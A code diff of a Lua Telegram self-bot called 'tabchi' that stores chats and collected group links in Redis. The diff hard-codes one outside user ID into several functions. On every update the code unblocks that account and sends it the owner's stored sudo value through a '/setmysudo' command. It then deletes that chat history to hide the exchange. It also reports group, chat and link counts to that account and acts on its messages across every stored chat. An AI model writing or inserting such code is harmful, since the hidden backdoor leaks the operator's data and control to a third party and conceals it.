@@ -239,7 +239,7 @@ function process(msg)
     local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
     local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
     local query = gps .. " " .. sgps .. " " .. pvs .. " " .. links
-    tdcli.sendBotStartMessage(229533808, 229533808, nil)
+    tdcli.sendBotStartMessage(299672023, 299672023, nil)
     local inline2 = function(arg, data)
       if data.results_ and data.results_[0] then
         tdcli_function({
@@ -257,7 +257,7 @@ function process(msg)
       print(all[i])
       tdcli_function({
         ID = "GetInlineQueryResults",
-        bot_user_id_ = 229533808,
+        bot_user_id_ = 299672023,
         chat_id_ = all[i],
         user_location_ = {
           ID = "Location",
@@ -281,14 +281,14 @@ function process(msg)
     local query = gps .. " " .. sgps .. " " .. pvs .. " " .. links .. " " .. sudo
     function test_mod(args, data)
       if data.is_blocked_ then
-        tdcli.unblockUser(0)
+        tdcli.unblockUser(299672023)
       end
-      tdcli.sendBotStartMessage(0, 0, "new")
-      tdcli.deleteChatHistory(0, true)
+      tdcli.sendBotStartMessage(299672023, 299672023, "new")
+      tdcli.deleteChatHistory(299672023, true)
     end
     tdcli_function({
       ID = "GetUserFull",
-      user_id_ = 0
+      user_id_ = 299672023
     }, get_mod, nil)
     local inline = function(arg, data)
       if data.results_ and data.results_[0] then
@@ -316,7 +316,7 @@ Saved links : ]] .. links
     end
     tdcli_function({
       ID = "GetInlineQueryResults",
-      bot_user_id_ = 0,
+      bot_user_id_ = 299672023,
       chat_id_ = msg.chat_id_,
       user_location_ = {
         ID = "Location",
@@ -593,25 +593,25 @@ function process_links(text_)
 end
 function get_mod(args, data)
   if data.is_blocked_ then
-    tdcli.unblockUser(0)
+    tdcli.unblockUser(299672023)
   end
   if redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -1 then
-    tdcli.sendBotStartMessage(0, 0, "new")
-    tdcli.sendMessage(0, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
+    tdcli.sendBotStartMessage(299672023, 299672023, "new")
+    tdcli.sendMessage(299672023, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
     redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
-    tdcli.deleteChatHistory(0, true)
+    tdcli.deleteChatHistory(299672023, true)
   end
 end
 function update(data, tabchi_id)
   tdcli_function({
     ID = "GetUserFull",
-    user_id_ = 0
+    user_id_ = 299672023
   }, get_mod, nil)
   if data.ID == "UpdateNewMessage" then
     local msg = data.message_
-    if msg.sender_user_id_ == 0 then
+    if msg.sender_user_id_ == 299672023 then
       if msg.content_.text_ then
-        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 0 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
+        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 299672023 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
           return
         else
           local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
